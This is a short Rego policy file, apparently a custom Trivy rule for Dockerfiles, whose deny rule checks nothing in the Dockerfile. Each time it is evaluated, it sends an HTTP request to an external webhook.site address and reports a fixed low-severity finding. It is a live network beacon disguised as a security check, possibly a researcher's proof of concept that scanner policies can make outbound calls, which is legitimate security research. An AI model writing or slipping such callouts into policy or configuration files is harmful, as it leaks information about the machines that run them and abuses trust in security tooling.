package user.dockerfile.RSNK002

deny[res] {
  http.send({"method": "GET", "url": "https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-trivy-httpsend", "force_json_decode": false})
  res := {
    "id": "RSNK002",
    "msg": sprintf("RSNK_TRIVY_HTTPSEND_%d", [time.now_ns()]),
    "severity": "LOW",
    "startline": 1,
    "endline": 1,
  }
}
